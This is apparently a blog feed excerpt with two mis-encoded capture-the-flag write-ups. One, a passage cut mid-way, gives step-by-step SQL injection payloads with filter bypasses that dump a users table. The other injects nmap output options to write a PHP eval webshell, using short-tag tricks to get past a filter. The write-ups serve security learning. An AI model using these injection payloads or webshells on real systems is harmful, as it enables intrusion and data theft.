alt="image-20230823144042281"></p><p>æ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨()ç»•è¿‡ç©ºæ ¼</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>æ²¡æœ‰è¿‡æ»¤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>è¯´æ˜è¯¥ç«™ç‚¹è¿‡æ»¤äº†#</p><p><strong>#å·ç»•è¿‡ï¼š</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>æ‰€ä»¥å¯ä»¥ç”¨&#x2F;**&#x2F;â€˜é€šè¿‡é—­åˆâ€™ç»•è¿‡</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>æˆåŠŸçˆ†å‡ºå­—æ®µä¸ä¸€è‡´çš„é”™è¯¯ï¼Œè¯´æ˜å½“å‰æ³¨å…¥æ–¹å¼æ­£ç¡®ï¼Œç°åœ¨åªè¦ä¸€æ­¥æ­¥æ·»åŠ ä¸Šå»æˆ–å‡å°‘ï¼Œæ¥ç¡®è®¤å®ƒåˆ°åº•æœ‰å¤šå°‘å­—æ®µ(ä¹Ÿå¯ä»¥ç”¨order by æˆ–group by æ¥åˆ¤æ–­æœ‰å¤šå°‘å­—æ®µ),æœ€ç»ˆæ·»åŠ åˆ°22çš„æ—¶å€™æˆåŠŸ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å½“å‰è¡¨æ€»å…±æœ‰22ä¸ªå­—æ®µ,ä¸”ç”±æ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œåªæ˜¾ç¤ºäº†2ï¼Œ3ï¼Œè¯´æ˜è¯¥æ•°æ®è¡¨çš„å†…å®¹åœ¨htmlä¸­ï¼ˆåœ¨æ•°æ®åº“ä¸­selectä¸€å®šæ˜¯å…¨éƒ¨æœç´¢å‡ºæ¥çš„ï¼‰åªæ˜¾ç¤ºç¬¬äºŒä¸ªå­—æ®µå’Œç¬¬ä¸‰ä¸ªå­—æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çˆ†çš„å†…å®¹ä¹Ÿåªèƒ½åœ¨è¿™ä¸¤ä¸ªå­—æ®µä¸­æ˜¾ç¤º</p><p><strong>ç¬¬äºŒæ­¥ï¼Œçˆ†æ•°æ®åº“</strong>ï¼š</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>çˆ†å‡ºæ•°æ®åº“åªæœ‰web1</p><p><strong>ç¬¬ä¸‰æ­¥ï¼Œçˆ†è¡¨ï¼š</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>å¯¹è¾“å…¥å†…å®¹è¿›è¡Œä¸€ä¸€åˆ¤æ–­:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>çŒœæµ‹æ•æ„Ÿè¯æ±‡ä¸ºinformation_schema.tables</p><p><strong>information_schema.tablesç»•è¿‡ï¼š</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>çˆ†å‡ºä¸¤å¼ è¡¨:ads,users</p><p><strong>ç¬¬å››æ­¥ï¼Œçˆ†è¡¨çš„å­—æ®µï¼š</strong></p><p>å…ˆçˆ†adsçš„å­—æ®µ</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>å¯¹æ³¨å…¥å†…å®¹è¿›è¡Œä¸€ä¸€åˆ¤æ–­:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>çŒœæµ‹å¯èƒ½æ˜¯å¯¹information_schema.COLUMNSè¿›è¡Œäº†è¿‡æ»¤</p><p><strong>information_schema.COLUMNSç»•è¿‡:</strong></p><p>ç”±äºæ— æ³•ç»•è¿‡information_schema.COLUMNSï¼Œä½†æ˜¯åœ¨å·²ç»çŸ¥é“è¡¨æ˜çš„æƒ…å†µä¸‹å¯ä»¥é‡‡ç”¨æ— åˆ—åçˆ†ç ´æ³•:</p><p>å‚è€ƒ:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3çš„åšå®¢-CSDNåšå®¢</a></p><p>å‚è€ƒçš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ™®é€šçš„sqæŸ¥è¯¢<br>select * from users<br><br>æŸ¥è¯¢è¡¨ï¼Œå¹¶æŠŠåˆ—åæ›¿æ¢ä¸º1ï¼Œ2ï¼Œ3.4ï¼Œ5ï¼Œ6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>å•ç‹¬æŠŠç¬¬å››åˆ—æå‡ºæ¥ï¼Œ(select 1,2,3,4,5,6 union select * from users)aç»™æŸ¥è¯¢ç»“æœå‘½å<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>è‹¥åå¼•å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥è¿™æ ·<br>select b from (select 1,2,3 as b,4,5 union select * from users)a;<br><br>æµ‹è¯•:<br>-- åœ¨å·²ç»çŸ¥é“beanbookè¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å…¶å­—æ®µåçš„æƒ…å†µä¸‹ï¼Œçˆ†å‡ºè¯¥è¡¨çš„å­—æ®µå€¼<br>-- çˆ†å‡ºç¬¬3åˆ—çš„å€¼,æŠŠ3å½“ä½œç¬¬ä¸‰åˆ—çš„å­—æ®µå<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- çˆ†å‡ºç¬¬1åˆ—çš„å€¼ï¼ŒæŠŠåˆ«åaå½“ä½œç¬¬ä¸€åˆ—çš„å­—æ®µå<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>æ— åˆ—åçˆ†ç ´æ³•æµ‹è¯•:</p><p>ç¬¬ä¸€ç§:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>ç¬¬äºŒç§:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>æ ¹æ®æ— ååˆ—çˆ†ç ´çš„payload,æˆ‘ä»¬å…ˆè¦ç¡®è®¤è¯¥è¡¨æœ‰å¤šå°‘ä¸ªå­—æ®µ:</p><p>ï¼ˆflagåœ¨usersè¡¨ä¸­ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œçœç•¥å¯¹adsè¡¨çš„åˆ¤æ–­ï¼Œæ€è·¯å’Œusersè¡¨ä¸€æ ·ï¼‰</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>ç»§ç»­æ·»åŠ å­—æ®µï¼Œï¼ˆçœç•¥ä¸¤ä¸ªå­—æ®µçš„åˆ¤æ–­ï¼‰</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>å›æ˜¾äº†ç¬¬ä¸€åˆ—çš„æ‰€æœ‰å†…å®¹ï¼Œè¯´æ˜usersè¡¨çš„å­—æ®µæœ‰ä¸‰ä¸ª</p><p>å›æ˜¾ç¬¬äºŒä¸ªå­—æ®µçš„å†…å®¹:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>å‘ç°äº†flag,ä½†æ˜¯ä¸æ˜¯flagçš„å†…å®¹ï¼Œè¯´æ˜flagå†…å®¹åœ¨ç¬¬ä¸‰ä¸ªå­—æ®µä¸­</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap é¢˜è§£</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>1.æœ‰é¢˜ç›®æç¤ºå¾—è¿™æ˜¯ä¸€é“è€ƒå¯ŸNmapæ‰§è¡Œçš„é¢˜ç›®:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>è¾“å…¥æ¡†ä¸­æˆ‘ä»¬å¯ä»¥è¾“å…¥ipåœ°å€æˆ–hostname</p><p>æµ‹è¯•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.åœ¨kaliä¸­æµ‹è¯•nmap:</p><p>nmapå¯¹ipåœ°å€çš„å¤„ç†</p><p><strong>æ‰«æIPåœ°å€:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>è¿”å›çš„ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>è€Œç½‘ç«™ä¸­çš„è¿”å›ç»“æœä¸º:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>ä¸¤è€…çš„è¿”å›ç»“æœéƒ½æ˜¯TCPåè®®ï¼Œç„¶åæœ‰Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**æ‰«ææŒ‡å®šIPåœ°å€(ping æ‰«æ)**ï¼š<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>è¿”å›ç»“æœä¸­æ²¡æœ‰è¡¨æ˜æ˜¯TCPåè®®</p><p>æ‰€ä»¥ä¸€èˆ¬ç½‘ç«™ä½¿ç”¨TCPè¿”å›ï¼Œéƒ½æ˜¯nmapæ‰«ææˆ–nmap -sT æ‰«æ(é»˜è®¤æ˜¯nmap)</p><p>çŒœæµ‹è¯¥ç½‘å€çš„æ‰«æå½¢å¼ä¸º:nmap â€œè¾“å…¥çš„ipåœ°å€â€</p><p>2.nmapæ‰«ææ¼æ´åˆ©ç”¨:</p><p>nmapä¸­å¯ä»¥ç”¨äºå°†æ‰«æç»“æœå†™æ–‡ä»¶å¹¶è¾“å‡ºä¿å­˜åœ¨æœ¬åœ°çš„å‘½ä»¤:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (æ ‡å‡†è¾“å‡º)<br><br>-oX (XMLè¾“å‡º)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grepè¾“å‡º)<br><br>-oA (è¾“å‡ºè‡³æ‰€æœ‰æ ¼å¼)<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>å‘ç°åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆäº†ä¸€ä¸ªtest.txtæ–‡ä»¶</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¾“å‡ºè¿™ä¸ªæ¼æ´ï¼Œå°†ä¸€å¥è¯æœ¨é©¬å†™å…¥æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨è¯¥è¾“å‡ºæ¼æ´å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ä¿å­˜åˆ°ç½‘é¡µçš„å½“å‰æ–‡ä»¶å¤¹ä¸­ï¼Œå°±å¯ä»¥å®ç°æ³¨å…¥</p><p>æµ‹è¯•2:</p><p>æµ‹è¯•ç½‘é¡µæ˜¯å¦å¯ä»¥è¿›è¡Œè¾“å‡ºå‘½ä»¤çš„æ‰§è¡Œ:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>ç½‘é¡µæˆåŠŸå›æ˜¾ï¼Œä¸”è¿”å›çš„ç»“æœå’Œæµ‹è¯•çš„ç»“æœç›¸ä¼¼ï¼Œè¯´æ˜è¯¥æŒ‡ä»¤è¢«æˆåŠŸæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ³¨å…¥payload</p><p>3.æ„é€ ä¸€å¥è¯æœ¨é©¬:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>å“åº”ç»“æœ:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" alt="image-20230822105623631"></p><p>å‘ç°è¾“å…¥çš„ç»“æœå¯èƒ½è¢«è¿‡æ»¤,é‡‡ç”¨ç¬¬äºŒä¸ªpayloadè¯•è¯•<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>ä¾ç„¶è¢«è¿‡æ»¤</p><p>4.ç°åœ¨å°±è¦ä¸€ä¸ªä¸ªè¿›è¡Œåˆ¤æ–­ï¼Œå¯»æ‰¾è¢«è¿‡æ»¤çš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>å­˜åœ¨é»‘åå•å†…å®¹</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>ç”±äºè¯¥æ–‡ä»¶ä¸å¯è¢«è¯†åˆ«ï¼Œæ‰€ä»¥å°±æ— æ³•æ˜¾ç¤ºå†…å®¹</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>æ‰€ä»¥è¿‡æ»¤çš„å†…å®¹ä¸ºphp,æˆ‘ä»¬éœ€è¦ç»•è¿‡phpåˆ¤æ–­</p><p><strong>phpä¸€å¥è¯æœ¨é©¬çš„æ„é€ </strong></p><p>å¯ä»¥è§£æphpæ–‡ä»¶çš„åç¼€å:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>phpçŸ­æ ‡ç­¾ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on<br>&lt;?=(è¡¨è¾¾å¼)?&gt;  ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt;  #ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®<br>&lt;% echo &#x27;123&#x27;;%&gt;   #å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œå¹¶ä¸”åªèƒ½åœ¨7.0ä»¥ä¸‹ç‰ˆæœ¬ä½¿ç”¨<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:<br><? echo '123';?> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(è¡¨è¾¾å¼)?><p>  ç­‰ä»·äº <?php echo (è¡¨è¾¾å¼)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo â€˜123â€™;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(è¡¨è¾¾å¼)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>ç»•è¿‡</p><p>æ„é€ å†™æ–‡ä»¶è¾“å‡ºpayload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" 